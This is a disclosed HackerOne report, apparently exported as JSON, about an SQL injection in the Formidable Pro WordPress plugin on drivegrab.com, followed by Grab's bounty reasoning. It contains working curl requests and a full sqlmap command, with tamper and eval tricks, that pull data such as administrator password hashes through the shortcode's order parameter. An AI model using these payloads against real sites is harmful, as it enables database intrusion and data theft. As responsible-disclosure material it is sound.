{
  "id": 273946,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNzM5NDY=",
  "url": "https://hackerone.com/reports/273946",
  "title": "www.drivegrab.com SQL injection",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2017-10-03T00:38:43.321Z",
  "submitted_at": "2017-10-03T00:38:43.321Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "jouko",
    "url": "/jouko",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/mqyrwb0f5m6e7yq17l0nrhhz32yw/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 1659,
    "url": "https://hackerone.com/grab",
    "handle": "grab",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/659/d5a2e407a772cb09a7ef57167580acf021c9c407_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/659/d5a2e407a772cb09a7ef57167580acf021c9c407_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Grab",
      "twitter_handle": "GrabSG",
      "website": "https://grab.com",
      "about": "Grab is Southeast Asia's #1 ride-hailing app, food delivery service and cashless payment solution."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2017-11-17T06:28:15.090Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2017-11-17T06:24:35.931Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Summary:**\nThe website uses a WordPress plugin called Formidable Pro. I found an SQL injection in the plugin code.\n\n**Description:**\nThe plugin allows the site admin to create forms to be filled by users. For this end it implements some AJAX functions, including one to preview (or actually just view) a form. The functionality is probably intended for administrators to be used in the form design phase, but for some reason it is accessible to unauthenticated users.\n\nThe preview function accepts some parameters. Some of them allows the user to specify HTML and WordPress shortcodes (special WordPress markup) to be included with the preview. One of the shortcodes implemented by the Formidable Pro plugin contains an SQL injection vulnerability.\n\n## Browsers Verified In:\nN/A\n\n## Steps To Reproduce:\nVerifying the AJAX preview function with the cURL tool:\n~~~~\ncurl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview'\n~~~~\nThis request shows a preset \"contact us\" form (if form id is not defined, you'll get the first form in the database).\n\nThe preview AJAX request accepts some parameters. For example you can define HTML to be shown after the form:\n~~~~\ncurl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=hello world'\n~~~~\nYou see that \"hello world\" appears on the page after the \"Contact us\" form.\n\nThe HTML may contain WordPress shortcodes which are special markup in square brackets. There are shortcodes implemented by the WordPress core, and shortcodes implemented by plugins. Any of these can be included in the form preview.\n\nThe Formidable plugin implements several shortcodes. One of them is [display-frm-data] which displays data that people have entered in a form. It accepts a few parameters, e.g. the form id:\n\n~~~~\ncurl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=XXX[display-frm-data id=835]YYY'\n~~~~\n\nIn the resulting HTML you see some form entries between \"XXX\" and \"YYY\".\n\nThe [display-frm-data] shortcode also accepts parameters \"order_by\" and \"order\" for sorting the entries. The \"order_by\" parameter can contain a field ID or list of them. The \"order\" parameter is supposed to contain \"ASC\" or \"DESC\" to indicate the sorting direction. These parameters can be used to carry out an SQL injection.\n\nExample:\n~~~~\ncurl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=XXX[display-frm-data id=835 order_by=id limit=1 order=zzz]YYY'\n~~~~\n\nAlthough this example gives no meaningful output, you should see in the server logs that the \"zzz\" went in an SQL query which produced an error message.\n\nThe shortcode parameters are processed in various ways which makes it very complicated to perform a successful SQL query and retrieve data. However it is possible.\n\nThe injected code goes in the ORDER BY clause of an intermediate query that retrieves the list of form entry ID's. Results of the manipulated query aren't directly visible. The attacker can control the order of entries appearing on the page, which is enough to communicate one bit of data from the database.\n\nA further complication is that any comma symbols in the injected data are specially treated and affect the resulting SQL query in a way that creates errors. With careful formatting, however, the query can be salvaged.\n\nI came up with the following sqlmap options to retrieve any data from the database:\n~~~~\n./sqlmap.py -u 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&before_html=XXX[display-frm-data id=835 order_by=id limit=1 order=\"%2a( true=true )\"]XXX' --param-del ' ' -p true --dbms mysql --technique B --string persondetailstable --eval 'true=true.replace(\",\",\",-it.id%2b\");order_by=\"id,\"*true.count(\",\")+\"id\"'  --test-filter DUAL --tamper commalesslimit -D █████ --sql-query \"SELECT ██████████ FROM █████ WHERE id=2\"\n~~~~\nThis works with the latest sqlmap. The \"commalesslimit\" tamper module helps avoiding comma symbols in any LIMIT clauses. The --eval parameter does some processing to repair queries that contain commas in the SELECT clause.\n\nSpecifically, for each comma appearing in the order parameter, the plugin appends \",it.id\" in the query. The repair code appends \"-it.id+\" after each comma to neutralize the effect. In other words, an injected \"SELECT a,b\" query would be translated to \"SELECT a,it.id b\" by the shortcode logic. The repair code changes it to \"SELECT a, it.id-it.id+b\" which evaluates to the original injected query.\n\nResult of the above sqlmap command:\n~~~~\n[03:09:30] [INFO] testing █████\n[03:09:30] [INFO] confirming ██████\n[03:09:30] [INFO] the back-end DBMS is ███\nweb application technology: █████\nback-end DBMS: ███████\n[03:09:30] [INFO] fetching SQL SELECT statement query output: 'SELECT ███████ FROM ████ WHERE id=2'\n[03:09:30] [INFO] retrieved: 1\n[03:09:43] [INFO] retrieving the length of query output\n[03:09:43] [INFO] ███\n[03:10:46] [INFO] retrieved: █████             \nSELECT ██████ FROM ████ WHERE id=2 [1]:\n[*] ██████████\n~~~~\n\n## Supporting Material/References:\n\nAs a proof of concept I retrieved some data.\n\nTables in the database:\n~~~~\n[██████████]\n+---------------------------------+\n| █████████      |\n| █████████          |\n| █████████        |\n| ███████     |\n| ██████████ |\n| ███████         |\n| ██████████      |\n| ████ |\n| ██████████                |\n| ███                   |\n| ████████ |\n| █████████                 |\n| █████                  |\n| ███             |\n| █████████                  |\n| ███████ |\n| ███████         |\n| ██████████       |\n| ████             |\n| █████                  |\n| ██████████ |\n| ███                      |\n| █████                    |\n| ██████████                   |\n| ██████████                      |\n| ████████ |\n| █████████              |\n| ████                   |\n| ██████                      |\n| ████████                   |\n| ██████                      |\n+---------------------------------+\n~~~~\n\nAdministrator users and their password hashes:\n\n~~~~\n█████\n█████\n██████\n████████\n███\n█████\n████████\n~~~~\n\nWebroot path:\n~~~~\n███\n~~~~\n",
  "bounty_amount": "4500.0",
  "formatted_bounty": "$4,500",
  "weakness": {
    "id": 67,
    "name": "SQL Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 180,
  "voters": [
    "prathap_ilango",
    "secseth",
    "arkaic",
    "nick_sessa",
    "jin",
    "jokebookservice1",
    "n1m0",
    "putsi",
    "jensec",
    "smsecurity",
    "and 170 more..."
  ],
  "severity": {
    "rating": "high",
    "author_type": "Team"
  },
  "structured_scope": {
    "databaseId": 1678,
    "asset_type": "URL",
    "asset_identifier": "drivegrab.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 5905,
      "category": "team",
      "content": "The researcher reported that it was possible to exploit previously unknown SQL injection in a WordPress plugin called Formidable Pro which was fixed immediately. He was able to gain read access on wordpress database and provided us all the relevant details (PoC) required for us to reproduce the issue.\n\n_**As also stated on our Policy page:**_\n\n```\nOur rewards are impact-based. This means, for example, that we will issue a relatively high reward\nfor a vulnerability that has the potential to leak complete dataset of confidential data, but that we\nwill issue  lower reward for a vulnerability that allows an attacker to access to an isolated and limited\ndataset. When we have our reward meetings, we always ask one question: If a malicious attacker\nabuses this, how bad off are we? We assume the worst and pay out the bug accordingly.\n\nIf a single fix fixes multiple vulnerabilities, we treat this as a single vulnerability. \nFor example, if you find 3 vulnerabilities in a WordPress plugin we use, and our fix is to remove \nthe plugin, this will receive a single bounty, determined, as always, by impact.\n```\n\nTherefore, in order to be able to accurately identify the overall impact on business, we further investigated to find out the extent of data leakage. During our investigation, we found that database was storing a dataset (representing ~0.6%) containing our driver partners PII.\n\nResearcher also reported 2 other different security issues on same plugin, Formidable Pro. All the 3 vulnerabilities reported were on the latest plugin, and having no updates available at the time by the plugin developers. Deleting the plugin was a single fix.\n\nAfter assigning the severity based on the data exposure the researcher pointed out that, there is a way to pivot from the DB to wordpress admin dashboard exploiting iThemes-Sync authentication key which was exposed in a database. After our investigation we believe that pivoting was not possible in the context because of the server hardening. We fairly asked him to show specific evidence of his new finding in order to reassess the bounty. Because the SQL injection was already fixed the researcher was not able to perform any remote code execution but he did provided PoC for helping us to reproduce the RCE. From his understanding the only values required for performing RCE was user id and authentication key (which was stored in plaintext in a DB).\n\nWhile investigating this RCE using researcher's provided PoC we figured out that those two values are not enough for reproducing the RCE because of the following error message:\n\n```\nThe hash could not be validated as a correct hash.\n```\n\nOn checking with ithemes developers  on email, they responded with the following:\n\n```\nWe're using randomly generated salts for each site to build the hashes, but we can't go into specifics, for obvious security reasons.\n```\n\nSince neither we or the researcher were able to confirm the RCE we couldn't reassess the bounty.\n\nBased on above data points collected through our investigation, we decided to award the researcher 4500 USD. Also, to appreciate the researcher for spending valuable time and efforts in submitting other 2 detailed bug reports to us, on the same plugin. Since these 2 bug reports were considered duplicate because of single fix, yet we decided to award 250 USD on each duplicate bug report as well.\n\nNeedless to say, we take ALL reported vulnerabilities, very seriously and investigate them to best of our technical abilities. We have awarded 10,000 USD bounty to researchers, who have submitted vulnerabilities with critical impact, in the past and we will continue to do so in the future as well. \n\nAt the end of the day, all these efforts made by H1 triage team, H1 researchers and Grab security team, comes down to overall risk and impact to the business. However, we always aim to be fair. Some researchers won't agree with some of our decisions, but we're paying out to the best of our ethical ability and trust that the majority of researchers will consider their rewards fair and in many cases generous.\n\nWe would like to once again thank the researcher for his great report and allowing us to fix this issue. We really appreciate his help in keeping Grab and our customers safe and secure. ",
      "user": {
        "id": 148303,
        "username": "nozz_",
        "name": "Nozz",
        "bio": "Grab ambassador & Coffee drinker certified OSCP/E. Denver fan boy and part-time reverse shell catcher. Highly interested in BugBounty, Web & Mob sec.",
        "cleared": false,
        "verified": false,
        "website": "https://twitter.com/Nozz_",
        "location": "Singapore",
        "created_at": "2017-03-07T07:45:56.014Z",
        "url": "https://hackerone.com/nozz_",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/Pav4PNZrRD6jcjSGBPe7jAW5/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/Pav4PNZrRD6jcjSGBPe7jAW5/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/Pav4PNZrRD6jcjSGBPe7jAW5/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
